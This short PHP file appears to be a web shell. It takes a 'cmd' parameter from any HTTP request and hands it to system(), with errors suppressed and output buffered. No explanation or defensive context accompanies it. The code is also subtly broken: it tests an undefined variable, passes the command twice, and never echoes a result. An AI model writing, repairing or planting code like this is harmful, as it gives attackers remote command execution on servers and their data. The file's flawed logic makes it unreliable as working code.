<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	
	if ($func == "system") { @ob_start();	@system($cmd); $res = @ob_get_contents();	@ob_end_clean();}
	
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>